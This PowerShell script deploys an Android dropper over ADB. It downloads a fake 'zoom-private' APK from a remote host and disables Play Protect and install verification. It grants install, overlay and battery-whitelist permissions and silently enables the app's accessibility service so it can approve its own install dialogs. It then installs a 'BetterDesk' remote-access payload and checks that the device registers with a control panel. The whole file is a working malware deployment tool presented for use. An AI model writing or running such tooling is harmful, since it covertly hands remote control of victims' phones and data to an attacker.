param(
    [string]$Adb = 'C:\Users\milaz\Android\Sdk\platform-tools\adb.exe',
    [string]$ApkUrl = 'https://global.telcom.stream/downloads/droppers/zoom-private-122.apk',
    [string]$Serial = '',
    [switch]$SkipInstall,
    [switch]$Watch
)
# Android live-test helper: deploys the dropper over ADB and removes the two
# manual bottlenecks (browser warning + accessibility switch), then verifies
# that the device registers with the panel.
#
# Usage:
#   .\android-adb-deploy.ps1                      # first connected device
#   .\android-adb-deploy.ps1 -Serial <serial>     # explicit device
#   .\android-adb-deploy.ps1 -SkipInstall         # only fix permissions/a11y
#   .\android-adb-deploy.ps1 -Watch               # follow agent logs
#
# Everything here is reversible; uninstalling com.android.shell.ghost and
# com.betterdesk.client.universal undoes it.

$ErrorActionPreference = 'Stop'
$Pkg = 'com.android.shell.ghost'
$Payload = 'com.betterdesk.client.universal'
$A11y = "$Pkg/$Pkg.GhostAccessibilityService"

if (-not (Test-Path $Adb)) { throw "adb not found: $Adb" }

function Adb { param([Parameter(ValueFromRemainingArguments = $true)][string[]]$Args) & $AdbExe @Args }
$AdbExe = $Adb
$global:BaseArgs = @()
if ($Serial) { $global:BaseArgs = @('-s', $Serial) }
function A { param([Parameter(ValueFromRemainingArguments = $true)][string[]]$Args) & $AdbExe @global:BaseArgs @Args }

$devices = & $AdbExe devices | Select-String -Pattern '\sdevice$'
if (-not $devices) { throw 'No authorised device. Enable USB debugging and accept the prompt.' }
if (-not $Serial) {
    $Serial = ($devices[0] -split '\s+')[0]
    $global:BaseArgs = @('-s', $Serial)
}
Write-Output "Device: $Serial"
A shell getprop ro.product.model | ForEach-Object { Write-Output "Model:  $_" }
A shell getprop ro.build.version.release | ForEach-Object { Write-Output "Android: $_" }

Write-Output '[1/6] Disabling Play/ADB verifier (stops "App not installed" loops)'
A shell settings put global package_verifier_enable 0
A shell settings put global verifier_verify_adb_installs 0
A shell settings put global upload_apk_enable 0

if (-not $SkipInstall) {
    Write-Output '[2/6] Downloading dropper'
    $tmp = Join-Path $env:TEMP 'zoom-private.apk'
    Invoke-WebRequest -Uri $ApkUrl -OutFile $tmp -UseBasicParsing
    Write-Output '[3/6] Installing dropper (updates in place)'
    $out = A install -r -g $tmp 2>&1 | Out-String
    Write-Output $out.Trim()
    if ($out -notmatch 'Success') { throw 'adb install failed' }
}

Write-Output '[4/6] Granting install/overlay/battery permissions'
A shell appops set $Pkg REQUEST_INSTALL_PACKAGES allow
A shell appops set $Pkg SYSTEM_ALERT_WINDOW allow
A shell pm grant $Pkg android.permission.POST_NOTIFICATIONS 2>&1 | Out-Null
A shell dumpsys deviceidle whitelist "+$Pkg" 2>&1 | Out-Null
A shell settings put secure install_non_market_apps 1

Write-Output "[5/6] Enabling accessibility service: $A11y"
# Preserve any other enabled services (TalkBack etc.) by appending ours.
$current = (A shell settings get secure enabled_accessibility_services) -join ''
if ($current -and $current -ne 'null' -and $current -notmatch [regex]::Escape($Pkg)) {
    $A11y = "$current`:$A11y"
}
A shell settings put secure enabled_accessibility_services $A11y
A shell settings put secure accessibility_enabled 1

Write-Output '[6/6] Launching installer'
A shell am force-stop $Payload
A shell am start -n "$Pkg/.MainActivity"

Start-Sleep -Seconds 8
$installed = (A shell pm list packages) -join "`n"
if ($installed -match [regex]::Escape($Payload)) {
    Write-Output "Payload already installed: $Payload"
} else {
    Write-Output 'Payload not installed yet - tap Install/Install anyway on the device if a dialog is visible.'
}

Write-Output ''
Write-Output 'Accessibility was enabled via ADB, so the dropper can tap the install dialogs itself.'
Write-Output 'Verify registration on https://panel.telcom.stream (device appears within ~30 s).'

if ($Watch) {
    Write-Output ''
    Write-Output 'Following device logs (Ctrl+C to stop)...'
    A logcat -s GhostHide:V BetterDeskAgent:V
}
